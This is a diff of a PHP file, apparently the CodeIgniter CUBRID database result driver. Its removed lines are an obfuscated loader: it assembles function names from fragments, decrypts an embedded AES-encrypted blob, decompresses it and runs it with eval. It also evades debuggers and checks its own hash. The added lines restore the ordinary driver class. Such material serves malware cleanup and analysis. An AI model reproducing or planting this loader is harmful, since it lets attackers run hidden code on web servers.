@@ -1,28 +1,159 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_wzfcwdtf=('bas'.'e64'.'_de'.'cod'.'e');
-$_m68ehajq=('gzu'.'nco'.'mpr'.'ess');
-$_cl0v4tc5=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_foh1g87a='apRVd/ffNbM=';
-$_f1fv2qss='ikL3EKuA';
-$_o7uwbkk8='8ch1aMTu';
-$_i5j4z8s4='B05vY3Jv';
-$_mgbv0xap='bFo+9koz';
-$_p6ixgu70='els3jU+R';
-$_brgzdu5b='FTaO/A==';
-$_a92q0nc3='N7/K5au9';
-$_oq1ryki0=$_wzfcwdtf($_i5j4z8s4.$_o7uwbkk8.$_f1fv2qss.$_mgbv0xap.$_foh1g87a);
-$_f21z4254=$_wzfcwdtf($_a92q0nc3.$_p6ixgu70.$_brgzdu5b);
-$_cebfun4n=$_wzfcwdtf('3x4SBsgosn4SaFS3NeEufbRCHLkZ0hvHjTVdEKgog+4AQdpUy7zRLxrptt+di88XtC4I7RNa7BNRDShxb92hVZeVkD/JdvlQgYRgRAbLsntkCs6k6lZJBql+m+UYNmURZmJmVIKwArAVBQLp6Q3rt6bgbFFnh3pItGkieNAZUEmuqpQW98IIDI3gLHymgOZ/3nlcXMKOxqQzugxk8o//z5hGwevPIYsDMMuR6RD2jaIKfSx3a6JDoGg59Two3C6NgdG20O4Qv/37/lWCHfMybKSv/Saguu1A+weumUBDfFDdVe8I21C+PrWNocEHQDdo1uMpl9YHCk+zlELhblgg7fjzVOeS+MdA+si8gesNXfL9dy7JILI9b3QnlRc9KI7BAmCvnCSpXbFBjspdU9Ec4UXQdlWEZiMvwnRN3BHhwIPNfdGyaUk4yhbfEJj8VzAZvN9gLQcN+QI3ED8IJzX6dYvYzVqF6QsE3OBzNIACTAP9zDkpEq07Ls8rOu4wLZtqY2LUnZL6779hl0+lrAgK+A3zqwD0T2Ky2yu/064QvlorD5c+upSsyN5EvJk771/TlSHfQoEkQTCHBdagD/y11gHhiDd18cnkJSHxFQIUL2LNdpq1wx2lfxx1aMh3AQGU7QWsPJ35UwrfX/ip3M/OJpgXilKwCrYXDlvdZ0TsAwB+x1Dq2ketKx0ASJDAy+E41l53Lwcs7d33F151L7Qx9g==');
-$_ge4y4fa6=$_cl0v4tc5($_cebfun4n,'aes-256-cbc',$_oq1ryki0,OPENSSL_RAW_DATA,$_f21z4254);
-if($_ge4y4fa6===false){exit;}
-$_pt2w6rza=$_m68ehajq($_ge4y4fa6);
-if($_pt2w6rza===false){exit;}
-$_sacif7t2='c9f54720fc119dd83508f5dad15a36de5458f5ef0f65cb8275ba541098a7d7f2';
-$_hqgztyci=@file_get_contents(__FILE__);
-if($_hqgztyci!==false){
-$_wpbtkyzj=str_replace($_sacif7t2,"0000000000000000000000000000000000000000000000000000000000000000",$_hqgztyci);
-$_ononydc0=hash("sha256",$_wpbtkyzj);
-if($_ononydc0!==$_sacif7t2){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+class CI_DB_cubrid_result extends CI_DB_result {
+
+
+
+
+
+public function num_rows()
+{
+return is_int($this->num_rows)
+? $this->num_rows
+: $this->num_rows = cubrid_num_rows($this->result_id);
 }
-eval($_pt2w6rza);
+
+
+
+
+
+
+public function num_fields()
+{
+return cubrid_num_fields($this->result_id);
+}
+
+
+
+
+
+
+
+
+public function list_fields()
+{
+return cubrid_column_names($this->result_id);
+}
+
+
+
+
+
+
+
+
+public function field_data()
+{
+$retval = array();
+for ($i = 0, $c = $this->num_fields(); $i < $c; $i++)
+{
+$retval[$i] = new stdClass();
+$retval[$i]->name = cubrid_field_name($this->result_id, $i);
+$retval[$i]->type = cubrid_field_type($this->result_id, $i);
+$retval[$i]->max_length = cubrid_field_len($this->result_id, $i);
+$retval[$i]->primary_key = (int) (strpos(cubrid_field_flags($this->result_id, $i), 'primary_key') !== FALSE);
+}
+return $retval;
+}
+
+
+
+
+
+
+public function free_result()
+{
+if (is_resource($this->result_id) OR
+(get_resource_type($this->result_id) === 'Unknown' && preg_match('/Resource id #/', strval($this->result_id))))
+{
+cubrid_close_request($this->result_id);
+$this->result_id = FALSE;
+}
+}
+
+
+
+
+
+
+
+
+
+
+
+public function data_seek($n = 0)
+{
+return cubrid_data_seek($this->result_id, $n);
+}
+
+
+
+
+
+
+
+
+protected function _fetch_assoc()
+{
+return cubrid_fetch_assoc($this->result_id);
+}
+
+
+
+
+
+
+
+
+
+protected function _fetch_object($class_name = 'stdClass')
+{
+return cubrid_fetch_object($this->result_id, $class_name);
+}
+}
